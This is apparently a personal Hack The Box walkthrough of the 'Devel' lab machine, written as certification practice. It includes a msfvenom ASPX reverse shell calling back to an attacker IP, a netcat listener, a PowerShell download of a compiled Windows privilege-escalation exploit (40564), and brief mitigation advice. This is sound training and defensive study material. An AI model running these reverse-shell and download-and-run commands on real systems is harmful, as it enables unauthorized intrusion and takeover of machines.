# Hack the Box- Devel

One of the first HTB boxes I solved a few months ago from the [TJ Null List](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) in preparation for the PNPT and OSCP.

![](https://miro.medium.com/v2/resize:fit:1400/1*7nNCRPLlmjDNc0bB7fReYA.png)

Solving the “Devel” box can be divided into 3 main steps:

1.  **Recon**

-   We conduct some recon using nmap or rustscan
-   look into MS-IIS/7.5, google a bit about executable file types

2. **Enumeration**

-   using the anonymous FTP access

3. **Exploitation**

-   Use FTP to upload a reverse shell
-   After this initial foothold, we priv esc using a [https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)
-   Gain system authority

## Recon

```bash
nmap -sC -sV -O -oA nmap/initial 10.10.10.5
```

![](https://miro.medium.com/v2/resize:fit:1400/1*6bpI_nICZqPSQ8sT_mEb5Q.png)

```bash
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.5
```

![](https://miro.medium.com/v2/resize:fit:1400/1*29Ki38Na6wFpu7DRdXaUuw.png)

```bash
nmap -sU -O -oA nmap/udp 10.10.10.5
```

![](https://miro.medium.com/v2/resize:fit:1400/1*tr4VJqOG7bzIoyPAYXkIiQ.png)

## Enum

![](https://miro.medium.com/v2/resize:fit:1400/1*eFrKhKbRs2jBUM709dp8tw.png)

![](https://miro.medium.com/v2/resize:fit:1400/1*v4N0d9mFUVBcX_hzeXRugg.png)

We have some web-facing material and we can try to go to these pages.

> I think “evil” is left over from someone else working on the box 😅

![](https://miro.medium.com/v2/resize:fit:1400/1*pgkRWz6uSVSuFnPaSoKBmw.png)

## Exploitation

Create reverse-shell.aspx with msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.37 LPORT=4444 -o reverse-shell.aspx
```

![](https://miro.medium.com/v2/resize:fit:1400/1*0JcHijD_HIUEXnFLzH8i3A.png)

Push reverse-shell.aspx to the webserver

![](https://miro.medium.com/v2/resize:fit:1400/1*k4b2_9e6wlQ7GB_xg2zsNQ.png)

Start a listener with netcat in another terminal

``nc -nlvp 4444``

Visit [http://10.10.10.5/reverse-shell.asp](http://10.10.10.5/reverse-shell.aspc)x to activate the payload

![](https://miro.medium.com/v2/resize:fit:1400/1*Y_adv31A543qZtdwnlt9ag.png)

Gain shell on the listener

![](https://miro.medium.com/v2/resize:fit:1400/1*ZSlHdje0bHe9_tpZtZNekQ.png)

### Priv Esc

Find an exploit that works

```bash
searchsploit -m 40564  
  
#this will download it to our currect directory
```

Compile it

```bash
i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
```

Serve it

![](https://miro.medium.com/v2/resize:fit:1296/1*sMY91BB0AES7xjpupL7FWQ.png)

Get it with powershell or certutil

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.37:443/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"
```

![](https://miro.medium.com/v2/resize:fit:1400/1*mW5uplnUSDAIoCEq-265nw.png)

Once bad.exe is run the priv esc is immediate

![](https://miro.medium.com/v2/resize:fit:1160/1*kxhw_dq7D8S9ZWZFUa3BNA.png)

## Mitigation- How could this attack have been stopped?

1.  Disable anonymous access to the FTP server
2.  Configure the FTP server to only allow downloads
